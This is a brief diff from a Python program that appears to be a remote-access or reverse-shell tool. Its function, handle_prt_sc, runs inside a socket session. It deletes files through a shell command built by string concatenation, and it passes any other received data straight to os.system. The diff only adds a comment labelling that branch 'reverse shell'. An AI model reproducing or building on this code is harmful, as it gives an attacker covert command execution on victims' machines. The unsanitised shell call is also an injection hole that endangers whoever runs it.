@@ -40,6 +40,7 @@ def handle_prt_sc(destination_address, destination_port):
                 os.system("rm " + final_path)
                 n += 1
             else:
+                # other commands, reverse shell
                 os.system(data)
     finally:
         # CLOSES SOCKET
